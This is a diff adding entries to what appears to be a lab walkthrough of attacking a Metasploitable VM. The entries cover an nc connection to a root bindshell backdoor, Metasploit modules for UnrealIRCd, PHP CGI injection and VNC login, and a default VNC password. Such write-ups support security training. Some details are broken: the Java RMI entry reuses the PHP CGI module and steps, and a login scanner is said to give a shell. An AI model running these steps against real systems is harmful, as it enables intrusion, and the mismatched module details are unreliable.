@@ -60,9 +60,50 @@ Steps:
 ![image](https://github.com/user-attachments/assets/be1303d3-5c8b-48e3-ab5c-f0a671ea4b01)
 
 ### Bindshell Backdoor (Metasploitable root shell)
+- nc 192.168.0.103 1524
 
 ![image](https://github.com/user-attachments/assets/11345c83-8e97-48a5-8ded-d23e1d0bbef6)
 
+### IRC Backdoor (UnrealIRCd)
+- Module Used: exploit/unix/irc/unreal_ircd_3281_backdoor
+- Steps:
+1.	Set RHOST (Target IP address)
+2.	Set LHOST (Attacking IP address)
+3.	Set PAYLOAD cmd/unix/bind_netcat or cmd/unix/reverse
+4.	Execute the exploit to obtain a remote shell.
+
+![image](https://github.com/user-attachments/assets/72ea2b91-de85-428b-b936-7a20cf483f15)
+Unreal IRC Backdoor
+
+### Apache (CGI Argument Injection)
+- Module Used: exploit/multi/http/php_cgi_arg_injection
+- Steps:
+1.	Set  RHOST 
+2.	Execute payload to gain shell access.
+
+![image](https://github.com/user-attachments/assets/753ca40a-1930-4d41-8f77-4d8e68ed89f7)
+Apache (CGI Argument Injection)
+
+### Remote Code Execution on Java RMI
+- Module Used: exploit/multi/http/php_cgi_arg_injection
+- Steps:
+1.	Set  RHOST 
+2.	Execute payload to gain shell access.
+
+![image](https://github.com/user-attachments/assets/d182e0cc-70bb-4668-add4-2d8185301b10)
+
+### Unencrypted VNC Connection
+- Module Used: auxiliary/scanner/vnc/vnc_login
+- Steps:
+1.	Set RHOST 
+2.	Execute the exploit to obtain a remote shell.
+3.	Go to terminal “vncviewer 192.168.0.103” run this command.
+4.	Provide the password using the module.
+
+![image](https://github.com/user-attachments/assets/7acaa3a4-f8bf-4fb0-b048-c70044de15a6)
+
+vncviewer 192.168.0.103 and password is "password" as you can see from previous screenshot.
+![image](https://github.com/user-attachments/assets/43a5357f-8bae-4173-8fdd-87b876b31f8b)
 
 
 
